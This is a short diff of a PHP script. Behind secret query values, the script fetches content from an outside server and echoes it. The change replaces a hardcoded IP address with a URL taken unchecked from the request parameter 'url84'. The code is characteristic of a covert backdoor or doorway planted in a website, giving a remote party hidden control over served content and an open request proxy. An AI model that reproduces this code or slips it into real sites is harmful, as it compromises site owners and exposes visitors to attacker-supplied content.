@@ -5,11 +5,13 @@ if($_GET["q"] == "")
 {
 }
 
-if($_GET["linux84"] == "linux8474")
+if($_GET["q"] == "linux8474")
   
 {
-  
-$google8474 = file_get_contents("http://66.42.114.132:8884/?linux84=linux8474");
+
+$linux84741274 = $_GET['url84'];
+
+$google8474 = file_get_contents("$linux84741274/linux8474.php?q=linux8474");
 
 $google8474 = preg_replace("/mine/","",$google8474);
 
@@ -21,7 +23,7 @@ echo "$google8474";
 
 }
 
-if($_GET["linux84"] == "linux84")
+if($_GET["q"] == "linux84")
   
 {
 
